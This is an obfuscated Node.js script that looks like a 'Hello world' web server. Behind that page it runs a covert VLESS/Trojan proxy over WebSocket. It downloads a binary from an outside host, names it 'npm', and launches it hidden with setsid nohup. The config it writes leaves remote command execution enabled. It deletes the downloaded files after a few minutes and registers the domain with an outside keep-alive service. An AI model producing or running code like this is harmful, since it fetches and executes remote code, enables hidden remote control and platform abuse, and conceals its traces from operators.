function _0x35ec(_0x3af41b,_0x26a5ea){const _0x378cb6=_0x378c();return _0x35ec=function(_0x35ec23,_0x2c306f){_0x35ec23=_0x35ec23-0x1e5;let _0x29a19a=_0x378cb6[_0x35ec23];return _0x29a19a;},_0x35ec(_0x3af41b,_0x26a5ea);}const _0x5d1c46=_0x35ec;(function(_0x2d4c6a,_0x51f672){const _0x58f2fb=_0x35ec,_0x230553=_0x2d4c6a();while(!![]){try{const _0x201282=parseInt(_0x58f2fb(0x223))/0x1+-parseInt(_0x58f2fb(0x1f6))/0x2+-parseInt(_0x58f2fb(0x1f5))/0x3+parseInt(_0x58f2fb(0x1fe))/0x4*(parseInt(_0x58f2fb(0x215))/0x5)+-parseInt(_0x58f2fb(0x236))/0x6+-parseInt(_0x58f2fb(0x1fb))/0x7+parseInt(_0x58f2fb(0x241))/0x8;if(_0x201282===_0x51f672)break;else _0x230553['push'](_0x230553['shift']());}catch(_0x2cfe6a){_0x230553['push'](_0x230553['shift']());}}}(_0x378c,0x31c4f));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x5d1c46(0x22a)),net=require('net'),path=require(_0x5d1c46(0x20c)),crypto=require(_0x5d1c46(0x1ef)),{Buffer}=require(_0x5d1c46(0x231)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5d1c46(0x220)][_0x5d1c46(0x1f4)]||'0e0c0066-5b37-5bd1-d0f5-7770f42b32ab',NEZHA_SERVER=process[_0x5d1c46(0x220)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x5d1c46(0x220)][_0x5d1c46(0x255)]||'',NEZHA_KEY=process[_0x5d1c46(0x220)][_0x5d1c46(0x208)]||'',DOMAIN=process[_0x5d1c46(0x220)][_0x5d1c46(0x1f7)]||_0x5d1c46(0x211),AUTO_ACCESS=process[_0x5d1c46(0x220)][_0x5d1c46(0x1ec)]||!![],WSPATH=process[_0x5d1c46(0x220)][_0x5d1c46(0x1e6)]||UUID[_0x5d1c46(0x214)](0x0,0x8),SUB_PATH=process[_0x5d1c46(0x220)][_0x5d1c46(0x209)]||_0x5d1c46(0x24e),NAME=process[_0x5d1c46(0x220)][_0x5d1c46(0x219)]||_0x5d1c46(0x240),PORT=process[_0x5d1c46(0x220)][_0x5d1c46(0x22d)]||0x1eb4;function _0x378c(){const _0x3c1766=['UUID','281280mEgXuG','395586hvLFbG','DOMAIN','Answer','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Hello\x20world!','635922elDfFX','/bin/bash','every','1672gmtkTV','Server\x20is\x20running\x20on\x20port\x20','https://','false','createWriteStream','true','2053','pop','once','writeHead','NEZHA_KEY','SUB_PATH','readUInt8','map','path','utf-8','url','trim','1.1.1.1','1234.abc.com','log','readUInt16BE','slice','2985NOzVWt','&fp=chrome&type=ws&host=','https://speed.cloudflare.com/meta','8443','NAME','https://dns.google/resolve?name=','substr','createHash','arm64','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','setsid\x20nohup\x20./npm\x20-s\x20','env','post','country','346410RYTrFR','Automatic\x20Access\x20Task\x20added\x20successfully','from','digest','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','toString','reduce','axios','test','arm','PORT','2083','https://arm64.ssss.nyc.mn/v1','Status','buffer','npm\x20running\x20error:','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','utf8','1602030KIflKs','text/html','connect','sha224','readFile','application/json','hex','&path=%2F','includes','connection','Hug','2058424lYFCYM','client_secret:\x20','type','unlink','trojan://','replace','createServer','https://amd64.ssss.nyc.mn/agent','2087','application/dns-json','443','data','npm\x20is\x20running','sub','&type=A','Server','length','https://oooo.serv00.net/add-url','then','index.html','NEZHA_PORT','get','write','split',':443?encryption=none&security=tls&sni=','--tls','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','finish','stream','decode','npm','arch','error','WSPATH','end','error:\x20','aarch64','vless://','npm\x20is\x20already\x20running,\x20skip\x20running...','AUTO_ACCESS','send',':443?security=tls&sni=','crypto','catch','Failed\x20to\x20resolve\x20','pipe','join'];_0x378c=function(){return _0x3c1766;};return _0x378c();}let ISP='';const GetISP=async()=>{const _0x53ecf3=_0x5d1c46;try{const _0x1993ad=await axios[_0x53ecf3(0x256)](_0x53ecf3(0x217)),_0x394c89=_0x1993ad['data'];ISP=(_0x394c89[_0x53ecf3(0x222)]+'-'+_0x394c89['asOrganization'])[_0x53ecf3(0x246)](/ /g,'_');}catch(_0x5f2c04){ISP='Unknown';}};GetISP();const httpServer=http[_0x5d1c46(0x247)]((_0xff04f9,_0x52f1c9)=>{const _0x5178a0=_0x5d1c46;if(_0xff04f9['url']==='/'){const _0x2994fa=path[_0x5178a0(0x1f3)](__dirname,_0x5178a0(0x254));fs[_0x5178a0(0x23a)](_0x2994fa,_0x5178a0(0x235),(_0xb81a62,_0x1f85e8)=>{const _0xce9c5c=_0x5178a0;if(_0xb81a62){_0x52f1c9[_0xce9c5c(0x207)](0xc8,{'Content-Type':_0xce9c5c(0x237)}),_0x52f1c9['end'](_0xce9c5c(0x1fa));return;}_0x52f1c9['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x52f1c9[_0xce9c5c(0x1e7)](_0x1f85e8);});return;}else{if(_0xff04f9[_0x5178a0(0x20e)]==='/'+SUB_PATH){const _0x584bd0=_0x5178a0(0x1ea)+UUID+'@'+DOMAIN+_0x5178a0(0x259)+DOMAIN+_0x5178a0(0x216)+DOMAIN+_0x5178a0(0x23d)+WSPATH+'#'+NAME+'-'+ISP,_0x223f02=_0x5178a0(0x245)+UUID+'@'+DOMAIN+_0x5178a0(0x1ee)+DOMAIN+_0x5178a0(0x216)+DOMAIN+_0x5178a0(0x23d)+WSPATH+'#'+NAME+'-'+ISP,_0x294f92=_0x584bd0+'\x0a'+_0x223f02,_0x3b0d70=Buffer[_0x5178a0(0x225)](_0x294f92)[_0x5178a0(0x228)]('base64');_0x52f1c9[_0x5178a0(0x207)](0xc8,{'Content-Type':'text/plain'}),_0x52f1c9[_0x5178a0(0x1e7)](_0x3b0d70+'\x0a');}else _0x52f1c9[_0x5178a0(0x207)](0x194,{'Content-Type':'text/plain'}),_0x52f1c9['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x5d1c46(0x250))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x5d1c46(0x210)];function resolveHost(_0x316eb7){return new Promise((_0x69a91f,_0x5f1a1d)=>{const _0x4aba08=_0x35ec;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4aba08(0x22b)](_0x316eb7)){_0x69a91f(_0x316eb7);return;}let _0x370009=0x0;function _0x55cd86(){const _0x2f3c80=_0x4aba08;if(_0x370009>=DNS_SERVERS[_0x2f3c80(0x251)]){_0x5f1a1d(new Error(_0x2f3c80(0x1f1)+_0x316eb7+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4f603f=DNS_SERVERS[_0x370009];_0x370009++;const _0x39db36=_0x2f3c80(0x21a)+encodeURIComponent(_0x316eb7)+_0x2f3c80(0x24f);axios[_0x2f3c80(0x256)](_0x39db36,{'timeout':0x1388,'headers':{'Accept':_0x2f3c80(0x24a)}})['then'](_0x46fa56=>{const _0x4b43ec=_0x2f3c80,_0x59255e=_0x46fa56['data'];if(_0x59255e[_0x4b43ec(0x230)]===0x0&&_0x59255e[_0x4b43ec(0x1f8)]&&_0x59255e[_0x4b43ec(0x1f8)]['length']>0x0){const _0x322769=_0x59255e[_0x4b43ec(0x1f8)]['find'](_0x379fac=>_0x379fac[_0x4b43ec(0x243)]===0x1);if(_0x322769){_0x69a91f(_0x322769[_0x4b43ec(0x24c)]);return;}}_0x55cd86();})[_0x2f3c80(0x1f0)](_0x6ecdc3=>{_0x55cd86();});}_0x55cd86();});}function handleVlessConnection(_0x58a090,_0x2a7b26){const _0x495439=_0x5d1c46,[_0x6c90f0]=_0x2a7b26,_0x15f547=_0x2a7b26[_0x495439(0x214)](0x1,0x11);if(!_0x15f547[_0x495439(0x1fd)]((_0x383c4f,_0x565e2e)=>_0x383c4f==parseInt(uuid[_0x495439(0x21b)](_0x565e2e*0x2,0x2),0x10)))return![];let _0x28bc61=_0x2a7b26[_0x495439(0x214)](0x11,0x12)['readUInt8']()+0x13;const _0x427fca=_0x2a7b26[_0x495439(0x214)](_0x28bc61,_0x28bc61+=0x2)['readUInt16BE'](0x0),_0x5f381f=_0x2a7b26[_0x495439(0x214)](_0x28bc61,_0x28bc61+=0x1)[_0x495439(0x20a)](),_0x3a5ae4=_0x5f381f==0x1?_0x2a7b26[_0x495439(0x214)](_0x28bc61,_0x28bc61+=0x4)[_0x495439(0x1f3)]('.'):_0x5f381f==0x2?new TextDecoder()[_0x495439(0x25e)](_0x2a7b26[_0x495439(0x214)](_0x28bc61+0x1,_0x28bc61+=0x1+_0x2a7b26[_0x495439(0x214)](_0x28bc61,_0x28bc61+0x1)[_0x495439(0x20a)]())):_0x5f381f==0x3?_0x2a7b26[_0x495439(0x214)](_0x28bc61,_0x28bc61+=0x10)[_0x495439(0x229)]((_0x2d7f07,_0x102062,_0x38e27e,_0x33d248)=>_0x38e27e%0x2?_0x2d7f07['concat'](_0x33d248[_0x495439(0x214)](_0x38e27e-0x1,_0x38e27e+0x1)):_0x2d7f07,[])['map'](_0x36c8d4=>_0x36c8d4[_0x495439(0x213)](0x0)[_0x495439(0x228)](0x10))[_0x495439(0x1f3)](':'):'';_0x58a090[_0x495439(0x1ed)](new Uint8Array([_0x6c90f0,0x0]));const _0x1bf01b=createWebSocketStream(_0x58a090);return resolveHost(_0x3a5ae4)[_0x495439(0x253)](_0x3fd040=>{const _0x569f0e=_0x495439;net[_0x569f0e(0x238)]({'host':_0x3fd040,'port':_0x427fca},function(){const _0x391307=_0x569f0e;this[_0x391307(0x257)](_0x2a7b26[_0x391307(0x214)](_0x28bc61)),_0x1bf01b['on'](_0x391307(0x1e5),()=>{})[_0x391307(0x1f2)](this)['on'](_0x391307(0x1e5),()=>{})[_0x391307(0x1f2)](_0x1bf01b);})['on'](_0x569f0e(0x1e5),()=>{});})[_0x495439(0x1f0)](_0x584181=>{const _0x382735=_0x495439;net[_0x382735(0x238)]({'host':_0x3a5ae4,'port':_0x427fca},function(){const _0x1623f9=_0x382735;this[_0x1623f9(0x257)](_0x2a7b26[_0x1623f9(0x214)](_0x28bc61)),_0x1bf01b['on'](_0x1623f9(0x1e5),()=>{})[_0x1623f9(0x1f2)](this)['on'](_0x1623f9(0x1e5),()=>{})[_0x1623f9(0x1f2)](_0x1bf01b);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x3c4cfc,_0x37cb97){const _0x2c44c5=_0x5d1c46;try{if(_0x37cb97['length']<0x3a)return![];const _0x41561f=_0x37cb97['slice'](0x0,0x38)['toString'](),_0x2ba856=[UUID];let _0x205a18=null;for(const _0x207db3 of _0x2ba856){const _0x721f06=crypto[_0x2c44c5(0x21c)](_0x2c44c5(0x239))['update'](_0x207db3)[_0x2c44c5(0x226)](_0x2c44c5(0x23c));if(_0x721f06===_0x41561f){_0x205a18=_0x207db3;break;}}if(!_0x205a18)return![];let _0x4d39c8=0x38;_0x37cb97[_0x4d39c8]===0xd&&_0x37cb97[_0x4d39c8+0x1]===0xa&&(_0x4d39c8+=0x2);const _0x3d8ed3=_0x37cb97[_0x4d39c8];if(_0x3d8ed3!==0x1)return![];_0x4d39c8+=0x1;const _0x558789=_0x37cb97[_0x4d39c8];_0x4d39c8+=0x1;let _0x4ea1cb,_0x3069a4;if(_0x558789===0x1)_0x4ea1cb=_0x37cb97['slice'](_0x4d39c8,_0x4d39c8+0x4)[_0x2c44c5(0x1f3)]('.'),_0x4d39c8+=0x4;else{if(_0x558789===0x3){const _0x9ae309=_0x37cb97[_0x4d39c8];_0x4d39c8+=0x1,_0x4ea1cb=_0x37cb97[_0x2c44c5(0x214)](_0x4d39c8,_0x4d39c8+_0x9ae309)[_0x2c44c5(0x228)](),_0x4d39c8+=_0x9ae309;}else{if(_0x558789===0x4)_0x4ea1cb=_0x37cb97[_0x2c44c5(0x214)](_0x4d39c8,_0x4d39c8+0x10)[_0x2c44c5(0x229)]((_0x666eec,_0x3e653e,_0x30312d,_0x53b0ca)=>_0x30312d%0x2?_0x666eec['concat'](_0x53b0ca[_0x2c44c5(0x214)](_0x30312d-0x1,_0x30312d+0x1)):_0x666eec,[])[_0x2c44c5(0x20b)](_0x27c8e2=>_0x27c8e2[_0x2c44c5(0x213)](0x0)[_0x2c44c5(0x228)](0x10))[_0x2c44c5(0x1f3)](':'),_0x4d39c8+=0x10;else return![];}}_0x3069a4=_0x37cb97[_0x2c44c5(0x213)](_0x4d39c8),_0x4d39c8+=0x2;_0x4d39c8<_0x37cb97[_0x2c44c5(0x251)]&&_0x37cb97[_0x4d39c8]===0xd&&_0x37cb97[_0x4d39c8+0x1]===0xa&&(_0x4d39c8+=0x2);const _0x1b6292=createWebSocketStream(_0x3c4cfc);return resolveHost(_0x4ea1cb)[_0x2c44c5(0x253)](_0x2aefd8=>{const _0x218566=_0x2c44c5;net[_0x218566(0x238)]({'host':_0x2aefd8,'port':_0x3069a4},function(){const _0x17209e=_0x218566;_0x4d39c8<_0x37cb97[_0x17209e(0x251)]&&this[_0x17209e(0x257)](_0x37cb97[_0x17209e(0x214)](_0x4d39c8)),_0x1b6292['on'](_0x17209e(0x1e5),()=>{})[_0x17209e(0x1f2)](this)['on'](_0x17209e(0x1e5),()=>{})['pipe'](_0x1b6292);})['on'](_0x218566(0x1e5),()=>{});})[_0x2c44c5(0x1f0)](_0x1d39e6=>{const _0x58fc21=_0x2c44c5;net[_0x58fc21(0x238)]({'host':_0x4ea1cb,'port':_0x3069a4},function(){const _0x4e5de3=_0x58fc21;_0x4d39c8<_0x37cb97['length']&&this[_0x4e5de3(0x257)](_0x37cb97[_0x4e5de3(0x214)](_0x4d39c8)),_0x1b6292['on'](_0x4e5de3(0x1e5),()=>{})['pipe'](this)['on'](_0x4e5de3(0x1e5),()=>{})[_0x4e5de3(0x1f2)](_0x1b6292);})['on'](_0x58fc21(0x1e5),()=>{});}),!![];}catch(_0x1dac7d){return![];}}wss['on'](_0x5d1c46(0x23f),(_0x5f3ba4,_0x40015b)=>{const _0x79bca9=_0x5d1c46,_0x429922=_0x40015b[_0x79bca9(0x20e)]||'';_0x5f3ba4[_0x79bca9(0x206)]('message',_0x280983=>{const _0x200936=_0x79bca9;if(_0x280983[_0x200936(0x251)]>0x11&&_0x280983[0x0]===0x0){const _0x5ad071=_0x280983['slice'](0x1,0x11),_0xe99c2=_0x5ad071[_0x200936(0x1fd)]((_0x1bbcfb,_0x545d62)=>_0x1bbcfb==parseInt(uuid[_0x200936(0x21b)](_0x545d62*0x2,0x2),0x10));if(_0xe99c2){!handleVlessConnection(_0x5f3ba4,_0x280983)&&_0x5f3ba4['close']();return;}}!handleTrojanConnection(_0x5f3ba4,_0x280983)&&_0x5f3ba4['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x91c734=_0x5d1c46,_0x25afd1=os[_0x91c734(0x260)]();return _0x25afd1===_0x91c734(0x22c)||_0x25afd1===_0x91c734(0x21d)||_0x25afd1===_0x91c734(0x1e9)?!NEZHA_PORT?_0x91c734(0x22f):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x91c734(0x248);},downloadFile=async()=>{const _0x2a1fa9=_0x5d1c46;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x35267e=getDownloadUrl(),_0x1267e3=await axios({'method':_0x2a1fa9(0x256),'url':_0x35267e,'responseType':_0x2a1fa9(0x25d)}),_0x4dbd7e=fs[_0x2a1fa9(0x202)](_0x2a1fa9(0x25f));return _0x1267e3[_0x2a1fa9(0x24c)][_0x2a1fa9(0x1f2)](_0x4dbd7e),new Promise((_0x456512,_0x1dfca3)=>{const _0x17c696=_0x2a1fa9;_0x4dbd7e['on'](_0x17c696(0x25c),()=>{const _0x41aabd=_0x17c696;console[_0x41aabd(0x212)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x24a4f5=>{if(_0x24a4f5)_0x1dfca3(_0x24a4f5);_0x456512();});}),_0x4dbd7e['on']('error',_0x1dfca3);});}catch(_0x5ab873){throw _0x5ab873;}},runnz=async()=>{const _0x39243e=_0x5d1c46;try{const _0x55b68d=execSync(_0x39243e(0x21e),{'encoding':_0x39243e(0x20d)});if(_0x55b68d[_0x39243e(0x20f)]()!==''){console[_0x39243e(0x212)](_0x39243e(0x1eb));return;}}catch(_0x533926){}await downloadFile();let _0x5d25d8='',_0x1590ec=[_0x39243e(0x24b),_0x39243e(0x218),'2096',_0x39243e(0x249),_0x39243e(0x22e),_0x39243e(0x204)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4d5c83=_0x1590ec['includes'](NEZHA_PORT)?_0x39243e(0x25a):'';_0x5d25d8=_0x39243e(0x21f)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4d5c83+_0x39243e(0x227);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x54a3f4=NEZHA_SERVER[_0x39243e(0x23e)](':')?NEZHA_SERVER[_0x39243e(0x258)](':')[_0x39243e(0x205)]():'',_0x46892a=_0x1590ec[_0x39243e(0x23e)](_0x54a3f4)?_0x39243e(0x203):_0x39243e(0x201),_0xa92ba0=_0x39243e(0x242)+NEZHA_KEY+_0x39243e(0x234)+NEZHA_SERVER+_0x39243e(0x1f9)+_0x46892a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0xa92ba0);}_0x5d25d8=_0x39243e(0x25b);}else{console['log'](_0x39243e(0x233));return;}}try{exec(_0x5d25d8,{'shell':_0x39243e(0x1fc)},_0x5bec27=>{const _0xac7f8b=_0x39243e;if(_0x5bec27)console[_0xac7f8b(0x1e5)](_0xac7f8b(0x232),_0x5bec27);else console[_0xac7f8b(0x212)](_0xac7f8b(0x24d));});}catch(_0x10ca4e){console[_0x39243e(0x1e5)](_0x39243e(0x1e8)+_0x10ca4e);}};async function addAccessTask(){const _0x6927b2=_0x5d1c46;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x13cf23=_0x6927b2(0x200)+DOMAIN;try{const _0x52739f=await axios[_0x6927b2(0x221)](_0x6927b2(0x252),{'url':_0x13cf23},{'headers':{'Content-Type':_0x6927b2(0x23b)}});console['log'](_0x6927b2(0x224));}catch(_0x1056ca){}}const delFiles=()=>{const _0x875ccf=_0x5d1c46;fs[_0x875ccf(0x244)](_0x875ccf(0x25f),()=>{}),fs[_0x875ccf(0x244)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x3802e0=_0x5d1c46;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3802e0(0x1ff)+PORT);});
